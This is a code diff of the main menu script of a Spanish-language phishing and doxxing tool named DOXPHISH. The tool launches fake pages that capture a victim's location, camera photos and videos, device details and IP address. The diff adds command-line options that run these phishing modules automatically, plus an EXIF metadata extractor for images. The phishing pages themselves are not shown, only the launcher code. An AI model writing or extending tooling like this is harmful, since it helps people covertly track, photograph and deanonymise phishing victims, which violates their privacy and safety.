@@ -10,12 +10,11 @@ if os.getcwd() != get_dirname(__file__):
     print("DEBES ESTAR EN EL DIRECTORIO DE DOXPHISH PARA QUE NO TENGAS ERRORES")
     os.chdir(get_dirname(__file__))
 try:
-    import pystyle, requests, flask
+    import pystyle, requests
 except ModuleNotFoundError:
     os.system('pip install pystyle')
     os.system('pip install requests')
-    os.system('pip install flask')
-    
+
 import platform
 import sys
 import time 
@@ -36,6 +35,8 @@ sys.path.append(get_dirname('paginas/videos/change_seconds.py'))
 import change_seconds
 import config_videos
 
+#la version final de esta herramineta
+VERSION = 1.0
 
 red = "\033[91m"
 green = "\033[92m"
@@ -45,10 +46,48 @@ cyan = "\033[95m"
 purple = "\033[96m"
 reset = "\033[0m"
 
+parser = argparse.ArgumentParser(description=" PODRAS EJECUTAR EL PHISHING AUTOMATICAMENTE USANDO LOS ARGUMENTOS 1 AL 5 ")
+parser.add_argument("opcion", nargs = "?", default=None, help="[1 DOX-UBICACION [2 DOX-FOTOS [3 DOX-VIDEOS [4 DOX-DISPOSITIVO [5 DOX-IP")
+args = parser.parse_args()
+
+def get_info_fotos():
+    try:
+        from PIL import Image
+        import exifread
+    except ModuleNotFoundError:
+        os.system("pip install Pillow ExifRead")
+
+    try:
+        basic_banners()
+        print()
+        zph_style.to_style("NO TODAS LAS IMAGENES SON COMPATIBLES")
+        print("\n")
+        ask_root = input(zph_style.to_ask("INGRESA LA RUTA DE LA IMAGEN"))
+        with open(ask_root, 'rb') as img_file:
+            image = Image.open(img_file)
+            exif_data = exifread.process_file(img_file)
+    except FileNotFoundError:
+        zph_style.error("LA IMAGEN NO SE HA ENCONTRADO...")
+        main()
+    except UnboundLocalError:
+        main()
+
+    for tag in exif_data.keys():
+        if tag not in ('JPEGThumbnail', 'TIFFThumbnail', 'Filename', 'EXIF MakerNote'):
+            print(f"{tag}: {exif_data[tag]}")
+
+    print()
+    ask_exit = input(zph_style.to_ask("QUIERES SALIR(S/N)?"))
+    if ask_exit.lower() == "n":
+        get_info_fotos()
+    else:
+        main()
+
 def obtener_informacion_coordenada(latitud, longitud):
     url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={latitud}&lon={longitud}"
+
     headers = {
-       'User-Agent': 'MiAplicacion/1.0 (tuemail@dominio.com)'
+        'User-Agent': 'MiAplicacion/1.0 (tuemail@dominio.com)'
     }
     response = requests.get(url, headers=headers)
 
@@ -103,9 +142,9 @@ def opciones():
     options = """
  [01] DOX-UBICACION    [06] INFO-DE-IP 
  [02] DOX-FOTOS        [07] INFO-DE-UBICACION
- [03] DOX-VIDEOS       [08] REINICIAR
- [04] DOX-DISPOSITIVO
- [05] DOX-IP
+ [03] DOX-VIDEOS       [08] INFO-FOTOS
+ [04] DOX-DISPOSITIVO  [09] AYUDA
+ [05] DOX-IP           [10] CREDITOS 
 
 """ 
     colorate_time(options)
@@ -114,7 +153,7 @@ def opciones():
     c_r = random.choice((green, blue, cyan, purple))
     print()
     print()
-    zhsty = f""" {c_r}[{reset}10{c_r}] SALIR  [{reset}11{c_r}] CONFIGURAR"""
+    zhsty = f""" {c_r}[{reset}11{c_r}] SALIR  [{reset}12{c_r}] CONFIGURAR"""
     for i in zhsty:
         print(i, end="", flush=True)
         time.sleep(0.01)
@@ -129,8 +168,23 @@ def main():
         main_head.author_text()
         opciones()
         print()
-        ask_main = input(zph_style.to_ask("ELIGE UNA OPCION"))
-        
+        validos_opciones = [
+    "1", "01",
+    "2", "02",
+    "3", "03",
+    "4", "04",
+    "5", "05"]
+
+        if args.opcion == None:
+            pass
+        elif args.opcion not in validos_opciones:
+            zph_style.error("ARGUMENTO INVALIDO...")
+            exit()
+        else:
+            pass
+
+        ask_main = args.opcion if args.opcion else input(zph_style.to_ask("ELIGE UNA OPCION"))
+
         if ask_main == "1" or ask_main == "01":
             while True:
                 opciones_1 = """
@@ -145,8 +199,8 @@ def main():
                 c_r = random.choice((green, blue, cyan, purple))
                 print(f"""{c_r} [{reset}03{c_r}] REGRESAR AL MENU\n [{reset}04{c_r}] SALIR""")
                 print()
-                one_ask = input(zph_style.to_ask("ELIGE UNA OPCION"))
-                if one_ask == "1":
+                one_ask = args.opcion if args.opcion else input(zph_style.to_ask("ELIGE UNA OPCION"))
+                if one_ask == "1" or args.opcion == 1:
                     try:
                         os.chdir('paginas')
                         os.chdir('ubicacion')
@@ -169,7 +223,7 @@ def main():
                 else:
                     zph_style.error("INPUT INCORRECTO...")
 
-        elif ask_main == "8":
+        elif ask_main in ["13","restart", "reiniciar"]:
             reiniciar_script()
         elif ask_main == "2" or ask_main == "02":
             while True:
@@ -187,8 +241,13 @@ def main():
                 c_r = random.choice((green, blue, cyan, purple))
                 print(f"""{c_r}[{reset}05{c_r}] REGRESAR AL MENU\n [{reset}06{c_r}] SALIR""")
                 print()
-                three_ask = input(zph_style.to_ask("ELIGE UNA OPCION"))
-                if three_ask == "1":
+                if args.opcion:
+                    is_input = False
+                else:
+                    three_ask = input(zph_style.to_ask("ELIGE UNA OPCION"))
+                    is_input = True
+
+                if is_input == False or three_ask == "1":
                     try:
                         os.chdir('paginas')
                         os.chdir('fotos')
@@ -198,7 +257,7 @@ def main():
                     except FileNotFoundError:
                         zph_style.error("NO SE HA ENCONTRADO EL ARCHIVO...")
 
-                elif three_ask == "2":
+                elif three_ask == "2" and is_input == True:
                     sys.path.append('paginas/fotos')
                     from moverthree import process_imagethree
                     basic_banners()
@@ -240,8 +299,13 @@ def main():
                 c_r = random.choice((green, blue, cyan, purple))
                 print(f"""{c_r}[{reset}05{c_r}] REGRESAR AL MENU\n [{reset}06{c_r}] SALIR""")
                 print()
-                four_ask = input(zph_style.to_ask("ELIGE UNA OPCION"))
-                if four_ask == "1":
+                if args.opcion:
+                    is_input = False
+                else:
+                    four_ask = input(zph_style.to_ask("ELIGE UNA OPCION"))
+                    is_input = True
+
+                if is_input == False or four_ask == "1":
                     try:
                         os.chdir('paginas/videos')
                         subprocess.run(["python","videos.py"])
@@ -257,7 +321,7 @@ def main():
                     from moverfourth import process_imagefourth
                     process_imagefourth()
 
-                elif four_ask == "3":
+                elif four_ask == "3" and is_input == True:
                     basic_banners()
                     config_videos.change_root()
 
@@ -290,8 +354,13 @@ def main():
                 print("\n")
                 print(f"""{c_r} [{reset}03{c_r}] REGRESAR AL MENU\n [{reset}04{c_r}] SALIR""")
                 print()
-                sixth_ask = input(zph_style.to_ask("ELIGE UNA OPCION"))
-                if sixth_ask == "1":
+                if args.opcion:
+                    is_input = False
+                else:
+                    is_input = True 
+                    sixth_ask = input(zph_style.to_ask("ELIGE UNA OPCION"))
+
+                if is_input == False or sixth_ask == "1":
                     try:
                         os.chdir('paginas/dispositivo')
                         subprocess.run(["python", "dispositivo.py"])
@@ -308,7 +377,7 @@ def main():
 
                 elif sixth_ask == "3":
                     main()
-                elif sixth_ask == "4":
+                elif sixth_ask == "4" and is_input == True:
                     exit()
                 else:
                     zph_style.error("INPUT INCORRECTO...")
@@ -327,8 +396,13 @@ def main():
                 print()
                 print(f"""{c_r} [{reset}03{c_r}] REGRESAR AL MENU\n [{reset}04{c_r}] SALIR""")                
                 print()
-                fifth_ask = input(zph_style.to_ask("ELIGE UNA OPCION"))
-                if fifth_ask == "1":
+                if args.opcion:
+                    is_input = False
+                else:
+                    fifth_ask = input(zph_style.to_ask("ELIGE UNA OPCION"))
+                    is_input = True
+
+                if is_input == False or fifth_ask == "1":
                     try:
                         os.chdir('paginas')
                         os.chdir('ip')
@@ -375,8 +449,12 @@ def main():
 
                 except (TypeError, ValueError):
                     zph_style.error("COORDENADAS INVALIDAS...")
+                    main()
 
-        elif ask_main == "11":
+        elif ask_main == "8" or ask_main == "08":
+            get_info_fotos()
+
+        elif ask_main == "12":
             while True:
                 opciones_2 = """
  [01] CAMBIAR PUERTO GENERAL
@@ -407,7 +485,7 @@ def main():
                 else:
                     zph_style.error("INPUT INCORRECTO...")
 
-        elif ask_main == "10":
+        elif ask_main == "11":
             exit()
 
         elif ask_main == "6" or ask_main == "06":
